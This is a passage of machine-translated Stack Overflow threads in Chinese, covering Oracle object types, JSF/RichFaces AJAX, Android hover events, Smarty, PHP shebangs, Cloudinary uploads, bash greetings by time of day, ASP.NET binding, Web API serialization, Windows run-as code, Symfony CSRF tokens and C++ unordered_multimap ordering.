        returning make_ref(shadow_person, object_id) into v_ref_person;

        self.a_student := new student(v_ref_person);

        RETURN;
    END;
END;
/

CREATE OR REPLACE TYPE BODY STUDENT
AS
    CONSTRUCTOR FUNCTION STUDENT(p_person REF PERSON)
    RETURN SELF AS RESULT IS
    BEGIN
        self.a_person := p_person;
        RETURN;
    END;
END;
/

--Example of how to use it:
declare
    v_person person := person;
begin
    v_person.a := 'person a';
    v_person.b := 'b';
    v_person.a_student.a := 'student a';
    v_person.a_student.c := 'c';

    dbms_output.put_line(v_person.a_student.c);
end;
/ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-04-02T12:44:57.423

好的！由于我自己正在处理这个问题，我想分享我们是如何解决它的！！！

第一：没有直接的方法来解决 Oracle 中的内存循环依赖 -**但我们可以作弊 :-)**

只是为了注释 - REF 仅适用于存储对象，PL/SQL 不容易访问，因此在大多数情况下不是一个选项！

但是您可以通过使用继承和强制转换来解决这个问题！

只需定义一个几乎没有属性的基本类型，然后在该基本类型下创建您的类型。现在您的所有类型都可以具有基本类型的属性，因为基本类型没有对任何其他类型的引用 - 所以它不是循环的:-)

访问子类型的属性时，您只需将它们转换为适当的类型即可访问它们的属性和方法！

在您的情况下，只需定义类型 BASE_OBJECT 的所有属性，您就可以开始了！

*我有点自豪我已经弄清楚了，因为我在任何地方都没有找到任何关于这个的东西！！！

```
CREATE OR REPLACE TYPE test_base FORCE IS OBJECT(id NUMBER) NOT FINAL;
/

CREATE OR REPLACE TYPE test_person FORCE UNDER test_base
  ( student test_base
   ,name        varchar2(100)
  );
/

CREATE OR REPLACE TYPE test_student FORCE UNDER test_base
  ( person test_base
   ,university  VARCHAR2(100)
  );
/

DECLARE
  pers test_person;
  stud test_student;
BEGIN
  pers := test_person(1, NULL, 'Mike Ross');
  stud := test_student(2, pers, 'Havard');
  pers.student := stud;

  DBMS_OUTPUT.PUT_LINE('Name: '||pers.NAME);

  DBMS_OUTPUT.PUT_LINE('University:'||TREAT(stud AS test_student).university);

END;
/ 
```

# jsf - 在 JSF 中使用 AJAX 更新中继器

> ID：14346318
> 
> 赞同：0
> 
> 时间：2013-01-15T20:30:19.690
> 
> 标签：jsf, jsf-2, richfaces

我正在尝试基于此使用 AJAX 更新转发器列表：[如何使用 <f:ajax render> 重新渲染 <ui:repeat>](https://stackoverflow.com/questions/3547581/jsf-rerender-with-ajax)

但是 HTML 列表在第一次加载后不会更新，即使 ManagedBean 中的 ArrayList 是。

这是我的 xHTML 文件中的内容：

```
<h:form>
   <h:panelGroup id="messages">
       <a4j:repeat var="mes" value="#{talking.listMessages}">
          <h:outputText value="#{mes.sendTime}">
             <f:convertDateTime type="date" pattern="dd-MM-yyyy HH:mm"/>                                
          </h:outputText>
          #{mes.content}
       </a4j:repeat> 
   </h:panelGroup>
   <a4j:commandLink action="#{talking.testAdd}">
      <h:outputText value="Add Item" />
      <f:ajax execute="@form" render="messages" />
   </a4j:commandLink>
</h:form> 
```

在 MB 中，我做了这个简单的动作：

```
private ArrayList<Message> listMessages;

public void testAdd() {
  this.listMessages.add(new Message(/* [...] */));
} 
```

我错过了什么 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:35:22.003

检查 RichFaces 文档[`<a4j:commandLink>`](http://docs.jboss.org/richfaces/latest_4_2_X/Component_Reference/en-US/html/chap-Component_Reference-Actions.html#sect-Component_Reference-Actions-a4jcommandLink)：

> 该组件类似于 JavaServer Faces (JSF) 组件，不同之处在于它包括插入式 Ajax 行为。

知道了这一点，问题在于它`<f:ajax>`不适用于`<a4j:commandLink>`. 您应该将代码重写为：

```
<h:form>
   <h:panelGroup id="messages">
       <a4j:repeat var="mes" value="#{talking.listMessages}">
          <h:outputText value="#{mes.sendTime}">
             <f:convertDateTime type="date" pattern="dd-MM-yyyy HH:mm"/>
          </h:outputText>
          #{mes.content}
       </a4j:repeat>
   </h:panelGroup>
   <a4j:commandLink action="#{talking.testAdd}"
      render="messages">
      <h:outputText value="Add Item" />
   </a4j:commandLink>
</h:form> 
```

另外，请确保您的托管 bean 是`@ViewScoped`.

# android - Android检测手指悬停在按钮上时

> ID：14346327
> 
> 赞同：6
> 
> 时间：2013-01-15T20:30:48.947
> 
> 标签：android, button, onhover

我创建了一个游戏，如果用户按下一个按钮，它会将蛇移动到那个特定的方向。

而不是当你按下一个按钮时，我想让它当手指悬停在按钮上时蛇会移动。

所以我将方法从`setOnTouchListener`, 更改为`setOnHoverListener`

这是我的代码：

```
Button btnRight = (Button) findViewById(R.id.btnRight);
btnRight.setOnHoverListener(new OnHoverListener(){
    public boolean onHover(View v, MotionEvent event) {
        if(direction!=4)
            direction = 6;
        return false;
    }
}); 
```

当手指在屏幕上按下并被拖动到按钮上时，什么也没有发生。

当手指拖到按钮上时，我将如何让它注册？有简单的方法解决方案还是我必须检测坐标等？

# smarty - Smarty - 将简单代码传输到 smarty

> ID：14346334
> 
> 赞同：-1
> 
> 时间：2013-01-15T20:31:04.943
> 
> 标签：smarty

我有这个简单的代码，我需要帮助转移到 smarty。模板会是什么？文件会是什么？

```
 <?php
  if($_POST){
  $maxCislo = $_POST["maxCislo"];
  if($maxCislo >= 2;) {
  echo "2; "

    }
 for($i = 3; $i < $maxCislo; $i = $i + 2){
 $l = 0;
for($j = 2; $i > $j; $j++) {
if($i % $j == 0){
$l++;
 }
 }
if($l == 0){
echo "$i; ";
 }
}
 }
  ?>
 <html>
 <form method="post" action="#">
 <input type="text" name="maxCislo">
 <input type="submit" value="Odeslat">
 </form>
 </html> 
```

我们在这里做了 5 个小时，但不知何故我还是做不到。非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:48:35.430

我不完全确定问题是什么，或者您的代码实际做了什么，但看起来只需将 PHP 的每一行替换为 Smarty 等效项，就可以相当简单地转换为 Smarty。

这里有一些提示：

*   对于`if`声明，请使用`{if}...{/if}`：[http ://www.smarty.net/docs/en/language.function.if.tpl](http://www.smarty.net/docs/en/language.function.if.tpl)
*   对于`$_POST['foo']`，使用`$smarty.post.foo`：[http ://www.smarty.net/docs/en/language.variables.smarty.tpl#language.variables.smarty.request](http://www.smarty.net/docs/en/language.variables.smarty.tpl#language.variables.smarty.request)
*   要将一个变量分配给另一个变量，请使用`{assign var=name value=$value}`：[http ://www.smarty.net/docs/en/language.function.assign.tpl](http://www.smarty.net/docs/en/language.function.assign.tpl)
*   math(s) like`$i % $j`可以直接输出：[http ://www.smarty.net/docs/en/language.math.tpl](http://www.smarty.net/docs/en/language.math.tpl)
*   ...或`{assign}`通过使用双引号和反引号在一个或其他函数的值中使用：[http ://www.smarty.net/docs/en/language.syntax.quotes.tpl](http://www.smarty.net/docs/en/language.syntax.quotes.tpl)
*   `for`可以使用以下方法实现循环：`{section}`http: [//www.smarty.net/docs/en/language.function.section.tpl](http://www.smarty.net/docs/en/language.function.section.tpl)

# php - /usr/bin/env php shebang 在通过 sudo 或 cron 调用时打印标题

> ID：14346335
> 
> 赞同：3
> 
> 时间：2013-01-15T20:31:06.960
> 
> 标签：php

我`#!/usr/bin/env php`用来在命令行调用 PHP 脚本，效果很好。PHP 正确检测命令行并抑制 HTTP 标头。

但是我开始通过或通过 cron 作业调用我的脚本`sudo`，它已经开始打印 HTTP 标头。

```
>> ./test 
Hello world!

>> sudo -u nathan ./test 
Content-type: text/html

Hello world! 
```

./test 只包含以下代码：

```
#!/usr/bin/env php
<?php

echo 'Hello world!' , "\n"; 
```

我认为这与脚本是否通过 tty 有关，但我不确定。有没有办法防止这些标题被打印？我不认为我不能使用“-q”参数，因为我是通过 env 调用它的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T22:03:41.673

您的脚本会打印 HTTP 标头，因为`/usr/bin/env php`调用的是 PHP 可执行文件的 CGI 版本而不是 CLI。`which php`您可以通过首先运行以找出`/usr/bin/env php`指向的位置来验证这一点。然后运行`/usr/bin/php -v`（或返回任何路径`which php`）以查看它是 CGI 还是 CLI。

默认情况下，PHP 同时构建为 CLI 和 CGI​​。`-q`因此，要么修复您的 PHP 设置，要么使用带有选项而不是 的硬编码路径`env`，因为您是对的，您不能使用带有`env`. 我会做第一个。

# ruby-on-rails-3 - Cloudinary 上传文件但按钮仍显示“未选择文件”

> ID：14346339
> 
> 赞同：3
> 
> 时间：2013-01-15T20:31:20.693
> 
> 标签：ruby-on-rails-3, file-upload, cloudinary

我正在使用`cloudinary`并遵循这里的所有内容：http: [//cloudinary.com/blog/direct_image_uploads_from_the_browser_to_the_cloud_with_jquery](http://cloudinary.com/blog/direct_image_uploads_from_the_browser_to_the_cloud_with_jquery)

这是我的观点`haml`：

```
= form_tag items_path do
  = cl_image_upload_tag(:image_id, :crop => :limit, :width => 1000, :height => 1000)
  = submit_tag 'Submit' 
```

我已经检查并加载了所有 cloudinary javascript。该按钮正在将文件上传到 cloudinary，我的 chrome 控制台显示：

```
XHR finished loading: "https://api.cloudinary.com/v1_1/hhfk6ki1i/auto/upload". jquery.js:8417
send jquery.js:8417
jQuery.extend.ajax jquery.js:7969
send jquery.fileupload.js:600
$.widget._onSend jquery.fileupload.js:656
newData.submit jquery.fileupload.js:695
$.widget.options.add jquery.fileupload.js:137
$.Widget._trigger jquery.ui.widget.js:278
(anonymous function) jquery.fileupload.js:698
jQuery.extend.each jquery.js:612
$.widget._onAdd jquery.fileupload.js:688
$.widget._onChange jquery.fileupload.js:752
jQuery.event.dispatch jquery.js:3064
elemData.handle.eventHandle 
```

我希望我的按钮在选择文件后显示上传文件的名称。多亏了 cloudinary 插件，这是应该发生的事情，还是我应该实现所有 Javascript 来捕获该事件并更改我的上传标签？

我说的是这个按钮，它总是显示“未选择文件”（即使文件已上传并在 Cloudinary 中可用）：

![在此处输入图像描述](../Images/5195991b1852cacf9478866470383a27.png)

*顺便说一句：如果它是相关的。我没有使用`carrierwave`，也没有`Attachinary`因为我使用`couchrest_model`*

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-18T12:45:00.070

可以通过运行禁用在上传开始时替换输入字段的行为：

```
$('.cloudinary-fileupload').fileupload('option', 'replaceFileInput', false); 
```

上传完成时调用 cloudinarydone 的回调。如果您想在字段开始时隐藏字段（当输入字段被重置时），您可以使用：

```
$('.cloudinary-fileupload').bind('fileuploadchange', function() { $(this).hide()}) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T17:53:19.163

当使用基于 jQuery 的直接图像从浏览器上传到 Cloudinary 时，上传过程会在使用文件输入字段选择或拖动图像后立即开始。您的表单将使用直接上传的图像的标识符进行更新。

默认情况下，上传完成后会显示一个新的文件输入字段，所以不显示文件名。

您可以绑定到事件，如[相关博客文章](http://cloudinary.com/blog/direct_image_uploads_from_the_browser_to_the_cloud_with_jquery)下的`cloudinarydone`示例代码所示。收到此事件时，您可以隐藏文件输入字段并显示上传图像的预览缩略图。`Other development frameworks and advanced usage`

# bash - 在一天中的不同时间向用户打招呼 - Bash 脚本

> ID：14346342
> 
> 赞同：10
> 
> 时间：2013-01-15T20:31:34.493
> 
> 标签：bash, shell, unix

我需要根据一天中的时间向用户打招呼（使用“早上好”、“下午好”或“晚上好”）。

我已经获得了用户的详细信息（$userTitle $userName）但是我不确定如何根据时间以不同的方式问候某人......有什么想法吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-01-15T20:36:16.697

```
h=`date +%H`

if [ $h -lt 12 ]; then
  echo Good morning
elif [ $h -lt 18 ]; then
  echo Good afternoon
else
  echo Good evening
fi 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-15T20:35:54.853

你可以得到这样的时间：

```
TIME=$(date "+%H") 
```

然后对该值采取行动，即

```
if [ $TIME -lt 12 ]; then
    echo "Good morning"
elif [ $TIME -lt 18 ]]; then
    echo "Good afternoon"
else
    echo "Good evening"
fi 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T20:42:36.043

尝试这样做：

```
TIME=$(date "+%k")

if ((TIME < 12 )); then
    echo "Good morning"
elif ((TIME < 18 )); then
    echo "Good afternoon"
else
    echo "Good evening"
fi 
```

## 笔记

*   使用这种语法，无需记住`-ge`之类的。这就像算术
*   `((...))`是一个算术命令，如果表达式非零，则返回退出状态 0，如果表达式为零，则返回 1。`let`如果需要副作用（分配），也用作 的同义词。见[http://mywiki.wooledge.org/ArithmeticExpression](http://mywiki.wooledge.org/ArithmeticExpression)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-01-15T20:37:58.650

```
hour=`date +%H`
if [ $hour -le 12 ]; then
    echo 'good morning'
elif [ $hour -ge 18 ]; then
    echo 'good evening'
else
    echo 'good afternoon'
fi 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-01-15T20:53:05.340

除一个细节外，所有其他答案都是正确的。命令`date +%H`以 XX 格式返回小时数（例如，如果时间是 09:00:00，则返回“09”）。在 bash 中以零开头的数字是八进制数。因此，这种细微差别可能会导致错误。

例如：

```
if [ 09 > 10 ] 
then
    echo "it's something strange here"
fi 
```

将打印“这里有些奇怪”。

可能您选择了不会导致此类行为的时间间隔。但是对于保险，您可以写：

小时=`date +"%H" | sed -e 's/^0//g'`

小心点。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-08-24T10:55:34.390

如果在具有功能的 powershell 中呢？

```
function Get-Greeting
    {
    $Hour = (Get-Date).TimeOfDay.Hours
    if($Hour –ge 0 –and $Hour –lt 12)

    {
        $greet = “Good Morning give me a coffee !!”
    }
    elseif($Hour –ge 12 –and $Hour –lt 16)
    {
        $greet = “Good Afternoon How is the weather today?”
    }
    else
    {
        $greet = “Good Evening sir, want to sip a tea?”
    }

    $Username = $env:USERNAME

    return $(“$greet , You have logged in as User, $Username” )
    }
        enter code here 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2015-08-09T07:05:16.077

```
echo enter the time 
read time 
if [ $ time - lt 12 ]
then
echo good morning
elif [ $ time - lt 16 ]
then
echo good afternoon
elif [ $ time - lt 20 ]
then
echo good evening
elif [ $ time - lt 25]
then
echo good night
else
echo enter a valid number only 24 hour!!!!!!!
fi 
```

* * *

## 回答 #8

> 赞同：-2
> 
> 时间：2016-03-15T07:48:49.393

```
h=`date|cut -d" " -f4|cut -d: -f1`
if [ $h -lt 10 ]; then
 echo Good Morning
elif [ $h -gt 10 -o $h -lt 16 ]; then
 echo Good Afternoon
elif [ $h -gt 16 -o $h -lt 20 ]; then
 echo Good Evening
else
 echo Good Night
fi 
```

# c# - ListView + ItemTemplate 条件绑定

> ID：14346344
> 
> 赞同：1
> 
> 时间：2013-01-15T20:31:42.650
> 
> 标签：c#, asp.net, listview

我有一个列表视图，其中一个正在绑定我用户的照片图像。但是，如果 <%#Eval("Photo") %> 是一个空值，这意味着用户还没有上传照片，我想显示一个默认路径是

```
ConfigurationManager.AppSettings["USER_DEFAULTPROFILEPHOTO_PATH"]%> 
```

这是这里的行，它不会引发任何错误，但现在图像都是空白的。任何人都可以提供帮助？谢谢。

```
<a href="ProfilePage.aspx?user=<%#Eval("UserName") %>" target="_parent"><img src="<%#Eval("Photo") %> != null ? <%= ConfigurationManager.AppSettings["USER_PROFILEPHOTO_PATH"]%>/<%#Eval("UserName") %>/<%#Eval("Photo") %> : <%= ConfigurationManager.AppSettings["USER_DEFAULTPHOTO_PATH"]%>" class="tipTip" title="<%#Eval("Name") %>" style="border: 1px solid #B6B6B6; height: 55px; width: 50px" alt=""></a> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:58:35.167

您的源绑定不正确，试试这个：

**ASPX：**

```
<asp:ListView ID="lvImages" runat="server">
    <ItemTemplate>
        <img alt="profilePic" style="width: 30px; height: 30px;" runat="server" src='<%# Eval("Photo") != null ? String.Format("{0}\\{1}\\{2}",ConfigurationManager.AppSettings["USER_PROFILEPHOTO_PATH"].ToString(),Eval("UserName"),Eval("Photo")) : ConfigurationManager.AppSettings["USER_DEFAULTPHOTO_PATH"].ToString() %>' />
    </ItemTemplate>
</asp:ListView> 
```

**后面的代码（在我这边重新创建以进行测试）：**

```
public partial class Home : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!Page.IsPostBack)
        {
            lvImages.DataSource = new List<MyImage>
            {
                new MyImage{UserName="Deni",Photo="pic1.jpg"},
                new MyImage{UserName="Chad",Photo="pic2.jpg"},
                new MyImage{Photo=null},
            };
            lvImages.DataBind();
        }
    }
}

public class MyImage
{
    public string UserName { get; set; }
    public string Photo { get; set; }
} 
```

**网站图片结构：**

![在此处输入图像描述](../Images/40431ade4c40a9923c92709b2e0352d0.png)

**网络配置：**

```
 <appSettings>
    <add key="USER_PROFILEPHOTO_PATH" value="~/Images"/>
    <add key="USER_DEFAULTPHOTO_PATH" value="~/Images/pic3.png"/>
  </appSettings> 
```

# asp.net - .Net Web API 序列化异常

> ID：14346345
> 
> 赞同：1
> 
> 时间：2013-01-15T20:31:42.980
> 
> 标签：asp.net, .net, xml-serialization, asp.net-web-api, wcf-web-api

我正在使用 .Net 的 Web API 编写一个简单的 API。我定义了以下模型：

```
public class VehicleUpdate
{
    [Required(ErrorMessage = "DealerID Required")]
    public int DealerID { get; set; }

    [Required(ErrorMessage = "VIN Required")]
    [StringLength(17, ErrorMessage = "VIN Must be 17 characters", MinimumLength = 17)]
    public string VIN { get; set; }

    [StringLength(8000, ErrorMessage = "Comments must be less than 8,000 characters")]
    public string Comments { get; set; }

    public double Retail { get; set; }
} 
```

我尝试通过使用以下 XML 执行 HTTP Post 来测试它

```
<VehicleUpdate>
    <DealerID>30</DealerID>
    <VIN>1FMRU17L0WLA62356</VIN>
    <Comments>This is a test.</Comments>
    <Retail>1000</Retail>
</VehicleUpdate> 
```

当我这样做时，我得到以下 SerializationException：

> System.Runtime.Serialization.SerializationException：第 1 行位置 16 出错。期望来自命名空间“http://schemas.datacontract.org/2004/07/API.Models”的元素“VehicleUpdate”。遇到名称为“元素”的“元素”车辆更新'，命名空间''。在 System.Runtime.Serialization.XmlObjectSerializer.ReadObjectHandleExceptions（XmlReaderDelegator 阅读器，布尔 verifyObjectName，DataContractResolver dataContractResolver）在 System.Runtime.Serialization. （XmlReader 阅读器）位于 System.Net.Http.Formatting.XmlMediaTypeFormatter.<>c_DisplayClass3 *。*

有人可以告诉我我做错了什么吗？我认为这将是一个有效的 XML 消息。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T20:50:05.163

两件事情：

正如错误所说，`DataContractSerializer`期望 XML 提供适当的名称空间，而您的 XML 没有它。您可以传递命名空间：

```
<VehicleUpdate xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/API.Models">
 // properties
</VehicleUpdate> 
```

`XmlSerializer`或者在您的 Web API 配置中切换到：

```
config.Formatters.XmlFormatter.UseXmlSerializer = true; 
```

然后您可以传递您现在传递的确切 XML。

`[Required]`在不可为空的类型上使用时，您可能会遇到另一个问题，即`int`。这是一个已知问题，因为`int`如果未通过，将始终为 0 而不是 null。在这种情况下，您可能必须更改模型以具有明确的`DataContract`定义：

```
 [DataContract]
    public class VehicleUpdate
    {
        [DataMember(IsRequired = true)]
        [Required(ErrorMessage = "DealerID Required")]
        public int DealerID { get; set; }

        [DataMember]
        [Required(ErrorMessage = "VIN Required")]
        [StringLength(17, ErrorMessage = "VIN Must be 17 characters", MinimumLength = 17)]
        public string VIN { get; set; }

        [DataMember]
        [StringLength(8000, ErrorMessage = "Comments must be less than 8,000 characters")]
        public string Comments { get; set; }

        [DataMember]
        public double Retail { get; set; }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-09-07T05:34:31.757

```
public static class WebApiConfig
    {
//....
        public static void Register(HttpConfiguration config)
        {  config.Formatters.XmlFormatter.UseXmlSerializer = true;
        GlobalConfiguration.Configuration.Formatters.JsonFormatter.SerializerSettings.PreserveReferencesHandling =
        Newtonsoft.Json.PreserveReferencesHandling.Objects;
} 
```

# mvvm - WinRT 中的 UI 逻辑 - MVVM

> ID：14346346
> 
> 赞同：1
> 
> 时间：2013-01-15T20:31:43.187
> 
> 标签：mvvm, windows-runtime, mvvm-light

UI 逻辑应该在 WindowsRT MVVM 应用程序中的什么位置？把它放在 ViewModel 上让它真的很“胖”，我想我们失去了 MVVM 模式的优势之一——设计师和程序员之间的分工变得非常困难。但是，我创建了几个“动态按钮”，并且这些按钮和驻留在 ViewModel 中的命令之间的耦合并不简单。处理 UI 逻辑的最佳方式是什么？我真的很想念触发器的功能。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T21:39:50.133

如果它不适合视图模型 - 将它放在后面的代码中。如果您希望它可重用 - 创建自定义控件或附加行为。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T14:48:26.063

拥有多个视图模型有意义吗？

例如，为您的页面创建一个视图模型，然后为自定义控件提供更具体的视图模型（作为主视图模型或聚合视图模型的属性）？

它使事物保持可测试性和可重用性...

# windows - 使用 vb.net 的 Windows 文件所有权和安全性？

> ID：14346348
> 
> 赞同：1
> 
> 时间：2013-01-15T20:31:58.927
> 
> 标签：windows, vb.net, security, login, vb.net-2010

有谁知道如何做到这一点？

*   在 1 台 PC 上，有 3 个普通用户和 2 个管理员：总共 5 个。
*   **我需要在 admin 1 帐户上运行**的 VB.net 应用程序来创建文件并设置仅对 admin 2 可用的所有权和权限，以便***只有 admin 2***可以访问、删除该文件等。
*   管理员 1 无法通过 Windows 访问该文件，但在该用户帐户上运行的应用程序可以。
*   因此，与此同时（当应用程序在管理员 1 上运行时），如果文件需要更改，应用程序应该能够再次更改文件。

**注意：**应用程序知道两个帐户的密码和登录信息。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T01:15:32.010

您是否尝试过 LogonUser 和[WindowsIdentity.Impersonate](http://msdn.microsoft.com/en-us/library/system.security.principal.windowsidentity.impersonate.aspx)？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:53:33.563

> admin 1 无法通过 windows 访问该文件，但在该用户帐户 (admin 1) 上运行的应用程序可以。

你无法按照你想要的方式实现这一点。在管理员 1 上运行的程序“是”该用户。如果程序可以，用户始终可以通过 Windows 访问该文件。

您可以让程序加密文件中的数据。admin 1 用户将能够读取加密的内容（看似随机的数据），并更改（从而破坏）它，或删除文件。但是，除非该用户破坏了加密，否则只有程序（知道文件是如何加密的）才能对其进行有效的更改。需要使用该文件的其他用户将需要通过该程序访问它（或另一个可以解密它以供使用的用户）。

另一种选择是创建另一个用户帐户，仅向管理员 2 和新帐户授予对文件的访问权限，并在“模拟”该新帐户后让应用程序访问它。然后，您将拒绝除管理员 1 之外的所有用户对程序本身的访问。但是，即使这样做，“域管理员”也可以获取该文件。

请记住，任何通过软件处理文件内容的用户都可以（例如）将其打印或复制到剪贴板，并对其进行任何操作。如果你不能相信你的员工会做正确的事，那么你可能注定要失败。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-23T09:48:23.600

在 MSDN 上花了一点时间后，我能想到的就是这些了，它与 windows 提供的“运行方式”相同

测试和工作正常

代码 ：

```
 Imports System
 Imports System.Runtime.InteropServices

 Module Module1

    Public Infinite As System.UInt32 = Convert.ToUInt32(&HFFFFFFF)
    Public Startf_UseStdHandles As Int32 = &H100
    Public StdOutputHandle As Int32 = -11
    Public StdErrorHandle As Int32 = -12

    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Auto)> _
    Public Structure StartupInfo
        Public cb As Integer
        Public reserved As String
        Public desktop As String
        Public title As String
        Public x As Integer
        Public y As Integer
        Public xSize As Integer
        Public ySize As Integer
        Public xCountChars As Integer
        Public yCountChars As Integer
        Public fillAttribute As Integer
        Public flags As Integer
        Public showWindow As UInt16
        Public reserved2 As UInt16
        Public reserved3 As Byte
        Public stdInput As IntPtr
        Public stdOutput As IntPtr
        Public stdError As IntPtr
    End Structure 'StartupInfo

    Friend Structure ProcessInformation
        Public process As IntPtr
        Public thread As IntPtr
        Public processId As Integer
        Public threadId As Integer
    End Structure 'ProcessInformation

    <DllImport("advapi32.dll", SetLastError:=True, CharSet:=CharSet.Unicode)> _
    Public Function CreateProcessWithLogonW(ByVal userName As String, ByVal domain As String, ByVal password As String, ByVal logonFlags As UInt32, ByVal applicationName As String, ByVal commandLine As String, ByVal creationFlags As UInt32, ByVal environment As UInt32, ByVal currentDirectory As String, ByRef startupInfo As StartupInfo, ByRef processInformation As ProcessInformation) As Boolean
    End Function

    <DllImport("kernel32.dll", SetLastError:=True)> _
    Public Function GetExitCodeProcess(ByVal process As IntPtr, ByRef exitCode As UInt32) As Boolean
    End Function

    <DllImport("Kernel32.dll", SetLastError:=True)> _
    Public Function WaitForSingleObject(ByVal handle As IntPtr, ByVal milliseconds As UInt32) As UInt32
    End Function

    <DllImport("Kernel32.dll", SetLastError:=True)> _
    Public Function GetStdHandle(ByVal handle As IntPtr) As IntPtr
    End Function

    <DllImport("Kernel32.dll", SetLastError:=True)> _
    Public Function CloseHandle(ByVal handle As IntPtr) As Boolean
    End Function

    <STAThread()> _
    Overloads Sub Main(ByVal args() As String)
        Dim MyPointer As IntPtr = Marshal.AllocHGlobal(4)
        Marshal.WriteInt32(MyPointer, StdOutputHandle)
        Dim MyErrorPointer As IntPtr = Marshal.AllocHGlobal(4)
        Marshal.WriteInt32(MyErrorPointer, StdErrorHandle)
        Dim startupInfo As New StartupInfo
        startupInfo.reserved = Nothing
        startupInfo.flags = startupInfo.flags And Startf_UseStdHandles
        startupInfo.stdOutput = MyPointer  
        startupInfo.stdError = MyErrorPointer     

        Dim exitCode As System.UInt32 = Convert.ToUInt32(123456)
        Dim processInfo As New ProcessInformation

        Dim command As String = "c:\windows\Notepad.exe"
        Dim user As String = "administrator"
        Dim domain As String = System.Environment.MachineName
        Dim password As String = "admin acct password"
        Dim currentDirectory As String = System.IO.Directory.GetCurrentDirectory()

        Try
            CreateProcessWithLogonW(user, domain, password, Convert.ToUInt32(1), _
                command, command, Convert.ToUInt32(0), Convert.ToUInt32(0), _
                currentDirectory, startupInfo, processInfo)
        Catch e As Exception
            Console.WriteLine(e.ToString())
        End Try
        Console.WriteLine("Running ...")
        WaitForSingleObject(processInfo.process, Infinite)
        GetExitCodeProcess(processInfo.process, exitCode)

        Console.WriteLine("Exit code: {0}", exitCode)

        CloseHandle(processInfo.process)
        CloseHandle(processInfo.thread)
    End Sub 

End Module 
```

# php - Symfony 渲染隐藏的表单域

> ID：14346357
> 
> 赞同：2
> 
> 时间：2013-01-15T20:32:40.413
> 
> 标签：php, forms, symfony

建议根据您的类创建表单类的文档，以便可以重用表单。它还向您展示了如何独立于表单类呈现不同的字段，而不是使用`{{ form_widget() }}`.

当我正在构建一个简单的注册页面时，我只想显示用户表单类中的一些字段，因此我将它们呈现为这样`{{ form_widget(form.email) }}`。

然而，因为我独立渲染字段，所以不会渲染隐藏的表单字段“CFTOKEN”，这是 symfony 框架所要求的。所以错误：`The CSRF token is invalid. Please try to resubmit the form.`

文档中没有提到这一点或如何独立呈现隐藏的表单字段......

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T22:15:35.317

```
<div style="display: none;">{{ form_rest(form) }}</div> 
```

会让你开始。一旦你熟悉了 S2，你会发现有很多选择。

例如，将参数传递给 UserFormType 的构造函数可以轻松控制创建哪些字段。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-15T20:47:29.583

这是唯一的方法真的..

```
{{ form_widget(form._token) }} 
```

Symfony 文档如何向您展示如何独立呈现每个表单字段，然后说您必须使用它`{{ form_rest(form) }}`来生成其余的必需字段，例如 CFtoken，因为它还呈现了您故意避免渲染的表单类中的所有表单字段，这非常令人惊讶独立完成它们，而不是仅仅使用 {{ form_widget() }}

GRRR

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-15T20:35:22.083

使用以下方式渲染其余字段：{{ form_rest(form) }}

[http://symfony.com/doc/2.0/reference/forms/twig_reference.html#form-rest-view-variables](http://symfony.com/doc/2.0/reference/forms/twig_reference.html#form-rest-view-variables)

# c++ - std::unordered_multimap 中的元素顺序

> ID：14346361
> 
> 赞同：4
> 
> 时间：2013-01-15T20:32:59.420
> 
> 标签：c++, stl, multimap

如果我有以下代码

```
std::unordered_multimap<std::string, std::vector<double>> myMap;
std::vector<double> v1, v2, v3;
// init v1, v2, v3....
myMap.insert(std::make_pair<std::string, std::vector<double>("vec", v1));
myMap.insert(std::make_pair<std::string, std::vector<double>("vec", v2));
myMap.insert(std::make_pair<std::string, std::vector<double>("vec", v3)); 
```

如果我使用迭代器访问值，它们将始终按以下顺序排列：`v1, v2, v3`

所以基本上如果我插入相同键但值不同的元素，它们是否**总是**保留插入顺序？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T20:37:24.160

我想这是特定于实现的。如果实现是桶哈希映射，则在具有相同键的`unordered_multimap`元素中存储在同一个桶中，在这种情况下，它们可能处于相同的插入顺序（这可能是您的情况）。

但是在一个`unordered_map`实施中，例如，使用开放寻址技术，顺序可能会改变。我不知道是否有 STL 实现在引擎盖实现下使用不同的实现，但类的合同并没有对同一键的值的顺序做出任何假设，所以我认为你不能接受它的确。

取自[这里](http://www.cplusplus.com/reference/unordered_map/unordered_map/)：

> 在内部，unordered_map 中的元素没有按任何特定顺序对它们的键或映射值进行排序

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-15T20:37:33.520

名称中“无序”的全部意义在于您不能依赖顺序。曾经。

如果您检测到任何来自迭代容器的订单，那是巧合或实现的产物。你*永远不*应该指望它。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-15T20:38:00.057

